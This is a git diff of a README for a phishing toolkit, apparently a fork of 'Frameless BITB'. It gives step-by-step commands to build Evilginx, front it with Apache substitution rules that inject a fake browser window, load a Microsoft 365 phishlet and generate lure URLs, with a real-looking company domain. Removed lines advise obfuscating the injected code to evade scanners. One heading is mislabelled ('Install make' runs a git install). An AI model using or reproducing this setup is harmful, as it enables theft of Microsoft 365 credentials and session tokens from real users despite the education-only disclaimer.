@@ -1,64 +1,13 @@
-# Frameless BITB
-
-A new approach to Browser In The Browser (BITB) without the use of iframes, allowing the bypass of traditional framebusters implemented by login pages like Microsoft.
-
-This POC code is built for using this new BITB with Evilginx, and a Microsoft Enterprise phishlet.
-
-
-![etech-bitb-DEMO-compressed](https://github.com/s4011779/etech-bitb/assets/43114112/4b4fbc89-526b-4982-b5e1-a8faf9754977)
-
-
-Before diving deep into this, I recommend that you first check my talk at BSides 2023, where I first introduced this concept along with important details on how to craft the "perfect" phishing attack. [▶ Watch Video](https://www.youtube.com/watch?v=p1opa2wnRvg)
-
-☕︎ [Buy Me A Coffee](https://www.buymeacoffee.com/waelmas)
-
-[**Video Tutorial:** 👇](#video-tutorial)
+# IMPORTANT - THIS REPO is entirely based on [wael-mas/Frameless-BITB](https://github.com/waelmas/frameless-bitb.git) but has been edit to show a etech-it.com.au instead of fake.com as the domain name, and streamlined instructions for setup
 
 # Disclaimer
 
 This tool is for educational and research purposes only. It demonstrates a non-iframe based Browser In The Browser (BITB) method. The author is not responsible for any misuse. Use this tool only legally and ethically, in controlled environments for cybersecurity defense testing. By using this tool, you agree to do so responsibly and at your own risk.
 
-
-# Backstory - The Why
-
-Over the past year, I've been experimenting with different tricks to craft the "perfect" phishing attack.
-The typical "red flags" people are trained to look for are things like urgency, threats, authority, poor grammar, etc.
-The next best thing people nowadays check is the link/URL of the website they are interacting with, and they tend to get very conscious the moment they are asked to enter sensitive credentials like emails and passwords.
-
-That's where Browser In The Browser (BITB) came into play. Originally introduced by @mrd0x, BITB is a concept of creating the appearance of a believable browser window inside of which the attacker controls the content (by serving the malicious website inside an iframe). However, the fake URL bar of the fake browser window is set to the legitimate site the user would expect. This combined with a tool like Evilginx becomes the perfect recipe for a believable phishing attack.
-
-The problem is that over the past months/years, major websites like Microsoft implemented various little tricks called "framebusters/framekillers" which mainly attempt to break iframes that might be used to serve the proxied website like in the case of Evilginx.
-
-In short, Evilginx + BITB for websites like Microsoft no longer works. At least not with a BITB that relies on iframes.
-
-
-# The What
-
-A Browser In The Browser (BITB) without any iframes! As simple as that.
-
-Meaning that we can now use BITB with Evilginx on websites like Microsoft.
-
-Evilginx here is just a strong example, but the same concept can be used for other use-cases as well.
-
-
-# The How
-
-Framebusters target iframes specifically, so the idea is to create the BITB effect without the use of iframes, and without disrupting the original structure/content of the proxied page.
-This can be achieved by injecting scripts and HTML besides the original content using search and replace (aka substitutions), then relying completely on HTML/CSS/JS tricks to make the visual effect.
-We also use an additional trick called "Shadow DOM" in HTML to place the content of the landing page (background) in such a way that it does not interfere with the proxied content, allowing us to flexibly use any landing page with minor additional JS scripts.
-
-
 # Instructions
 
-## Video Tutorial
-
-[![Thumbnail with YouTube Player](https://github.com/s4011779/etech-bitb/assets/43114112/5ebadac3-6998-4349-9c90-c1c5293ac6b6)](https://youtu.be/luJjxpEwVHI)
-
-
-https://youtu.be/luJjxpEwVHI
-
 ## Local VM:
-Create a local Linux VM. (I personally use Ubuntu 22 on VMWare Player or Parallels Desktop)
+Create a local Linux VM
 
 Update and Upgrade system packages:
 
@@ -66,30 +15,31 @@ Update and Upgrade system packages:
 sudo apt update && sudo apt upgrade -y
 ```
 
+## Install required packages:
 
-
-
-## Evilginx Setup:
-
-
-#### Setting Up Evilginx
-
-
-Download and build Evilginx: [Official Docs](https://help.evilginx.com/docs/intro)
-
-
-Copy Evilginx files to `/home/username`
-
-
-
-Install Go: [Official Docs](https://go.dev/doc/install)
-
+### NVM/Nodejs
 ```
-wget https://go.dev/dl/go1.21.4.linux-amd64.tar.gz
+# installs nvm (Node Version Manager)
+curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.0/install.sh | bash
+
+# download and install Node.js (you may need to restart the terminal)
+nvm install 20
+
+# verifies the right Node.js version is in the environment
+node -v # should print `v20.18.0`
+
+# verifies the right npm version is in the environment
+npm -v # should print `10.8.2`
 ```
 
+### Install Go: [Official Docs](https://go.dev/doc/install)
+
 ```
-sudo tar -C /usr/local -xzf go1.21.4.linux-amd64.tar.gz
+wget https://go.dev/dl/go1.23.2.linux-amd64.tar.gz
+```
+
+```
+sudo tar -C /usr/local -xzf go1.23.2.linux-amd64.tar.gz
 ```
 
 ```
@@ -107,61 +57,23 @@ Check:
 go version
 ```
 
-Install make:
+### Install make:
+
+```
+sudo apt install git
+```
+
+### Install make:
 
 ```
 sudo apt install make
 ```
 
-Build Evilginx:
-
-```
-cd /home/username/evilginx2
-```
-
-```
-make
-```
-
-
-Create a new directory for our evilginx build along with phishlets and redirectors:
-
-```
-mkdir /home/username/hack
-```
-
-
-Copy build, phishlets, and redirectors:
-
-```
-cp /home/kali/evilginx2/build/evilginx /home/kali/hack/evilginx
-
-cp -r /home/kali/evilginx2/redirectors /home/kali/hack/redirectors
-
-cp -r /home/kali/evilginx2/phishlets /home/kali/hack/phishlets
-```
-
-## Modify Evilginx Configurations:
-
-
-Since we will be using Apache2 in front of Evilginx, we need to make Evilginx listen to a different port than 443.
-
-```
-nano ~/.evilginx/config.json
-```
-
-CHANGE `https_port` from `443` to `8443`
-
-
-
-## Install Apache2 and Enable Mods:
-
-Install Apache2:
+### Install Apache2:
 
 ```
 sudo apt install apache2 -y
 ```
-
 
 Enable Apache2 mods that will be used:
 (We are also disabling access_compat module as it sometimes causes issues)
@@ -192,22 +104,88 @@ sudo systemctl start apache2
 ```
 sudo systemctl enable apache2
 ```
-
-Try if Apache and VM networking works by visiting the VM's IP from a browser on the host machine.
-
+## Evilginx Setup:
 
 
+#### Setting Up Evilginx
 
+[Official Docs](https://help.evilginx.com/docs/intro)
 
-## Clone this Repo:
-
-Install git if not already available:
+Download, install and build Evilginx:
 
 ```
-sudo apt -y install git
+git clone https://github.com/kgretzky/evilginx2.git
+
+cd /home/kali/evilginx2
 ```
 
-Clone this repo:
+```
+make
+```
+
+Create a new directory for our evilginx build along with phishlets and redirectors:
+
+```
+mkdir /home/kali/hack
+```
+
+Copy build, phishlets, and redirectors:
+
+```
+cp /home/kali/evilginx2/build/evilginx /home/kali/hack/evilginx
+
+cp -r /home/kali/evilginx2/redirectors /home/kali/hack/redirectors
+
+cp -r /home/kali/evilginx2/phishlets /home/kali/hack/phishlets
+```
+
+### It is important to run and begin configuration of evilginx before attempting to change the listening port in the following sets
+
+## Running Evilginx:
+
+
+At this point, everything should be ready so we can go ahead and start Evilginx, set up the phishlet, create our lure, and test it.
+
+```
+cd ~/evilginx/
+```
+
+```
+./evilginx -developer
+```
+
+Evilginx Config:
+
+```
+config domain etech-it.com.au
+```
+
+```
+config ipv4 127.0.0.1
+```
+
+
+**IMPORTANT:** Set Evilginx Blacklist mode to NoAdd to avoid blacklisting Apache since all requests will be coming from Apache and not the actual visitor IP.
+
+```
+blacklist noadd
+```
+
+
+## Modify Evilginx Configurations:
+
+
+Since we will be using Apache2 in front of Evilginx, we need to make Evilginx listen to a different port than 443.
+
+```
+nano ~/.evilginx/config.json
+```
+
+CHANGE `https_port` from `443` to `8443`
+
+## Clone BITB Repo:
+
+Clone the BITB Repo, based on [waelmas/frameless-bitb](https://github.com/waelmas/frameless-bitb.git):
 
 ```
 git clone https://github.com/s4011779/etech-bitb
@@ -216,9 +194,6 @@ git clone https://github.com/s4011779/etech-bitb
 ```
 cd etech-bitb
 ```
-
-
-
 
 ## Apache Custom Pages:
 
@@ -262,14 +237,6 @@ From inside the hack dir - copy the O365 phishlet to phishlets directory:
 sudo cp /home/kali/hack/etech-bitb/O365.yaml /home/kali/hack/phishlets/O365.yaml
 ```
 
-
-
-**Optional:** To set the Calendly widget to use your account instead of the default I have inside, go to `pages/primary/script.js` and change the `CALENDLY_PAGE_NAME` and `CALENDLY_EVENT_TYPE`.
-
-**Note on Demo Obfuscation:** As I explain in the walkthrough video, I included a minimal obfuscation for text content like URLs and titles of the BITB. You can open the demo obfuscator by opening `demo-obfuscator.html` in your browser.
-In a real-world scenario, I would highly recommend that you obfuscate larger chunks of the HTML code injected or use JS tricks to avoid being detected and flagged. The advanced version I am working on will use a combination of advanced tricks to make it nearly impossible for scanners to fingerprint/detect the BITB code, so stay tuned.
-
-
 ## Self-signed SSL certificates:
 
 Since we are running everything locally, we need to generate self-signed SSL certificates that will be used by Apache. Evilginx will not need the certs as we will be running it in developer mode.
@@ -299,9 +266,6 @@ Modify private key permissions:
 sudo chmod 600 /etc/ssl/localcerts/etech-it.com.au/privkey.pem
 ```
 
-
-
-
 ## Apache Custom Configs:
 
 Copy custom substitution files (the core of our approach):
@@ -318,10 +282,6 @@ Simply to make it easier, I included both versions as separate files for this ne
 ```
 sudo cp ./apache-configs/win-chrome-bitb.conf /etc/apache2/sites-enabled/000-default.conf
 ```
-
-
-
-
 
 Test Apache configs to ensure there are no errors:
 
@@ -381,67 +341,6 @@ This demo is made with the provided Office 365 Enterprise phishlet. To get the h
 
 
 
-## Trusting the Self-Signed SSL Certs:
-
-
-Since we are using self-signed SSL certificates, our browser will warn us every time we try to visit `etech-it.com.au` so we need to make our host machine trust the certificate authority that signed the SSL certs.
-
-For this step, it's easier to follow the video instructions, but here is the gist anyway.
-
-
-
-Open [https://etech-it.com.au/](https://etech-it.com.au/) in your Chrome browser.
-
-Ignore the Unsafe Site warning and proceed to the page.
-
-
-Click the SSL icon > Details > Export Certificate
-**IMPORTANT:** When saving, the name MUST end with .crt for Windows to open it correctly.
-
-Double-click it > install for current user. Do NOT select automatic, instead place the certificate in specific store: select "Trusted Route Certification Authorities".
-
-
-
-**On Mac:** to install for current user only > select "Keychain: login" **AND** click on "View Certificates" > details > trust > Always trust
-
-
-
-**Now RESTART your Browser**
-
-You should be able to visit `https://etech-it.com.au` now and see the homepage without any SSL warnings.
-
-
-## Running Evilginx:
-
-
-At this point, everything should be ready so we can go ahead and start Evilginx, set up the phishlet, create our lure, and test it.
-
-```
-cd ~/evilginx/
-```
-
-```
-./evilginx -developer
-```
-
-Evilginx Config:
-
-```
-config domain etech-it.com.au
-```
-
-```
-config ipv4 127.0.0.1
-```
-
-
-**IMPORTANT:** Set Evilginx Blacklist mode to NoAdd to avoid blacklisting Apache since all requests will be coming from Apache and not the actual visitor IP.
-
-```
-blacklist noadd
-```
-
-
 
 Setup Phishlet and Lure:
 
@@ -464,6 +363,29 @@ lures get-url 0
 
 Copy the lure URL and visit it from your browser (use Guest user on Chrome to avoid having to delete all saved/cached data between tests).
 
+
+## Trusting the Self-Signed SSL Certs:
+
+
+Since we are using self-signed SSL certificates, our browser will warn us every time we try to visit `etech-it.com.au` so we need to make our host machine trust the certificate authority that signed the SSL certs.
+
+For this step, it's easier to follow the video instructions, but here is the gist anyway.
+
+
+Open [https://etech-it.com.au/](https://etech-it.com.au/) in your Chrome browser.
+
+Ignore the Unsafe Site warning and proceed to the page.
+
+
+Click the SSL icon > Details > Export Certificate
+**IMPORTANT:** When saving, the name MUST end with .crt for Windows to open it correctly.
+
+Double-click it > install for current user. Do NOT select automatic, instead place the certificate in specific store: select "Trusted Route Certification Authorities".
+
+
+**Now RESTART your Browser**
+
+You should be able to visit your evilnginx2 lure now and see the phishing page without any SSL warnings.
 
 
 # Useful Resources
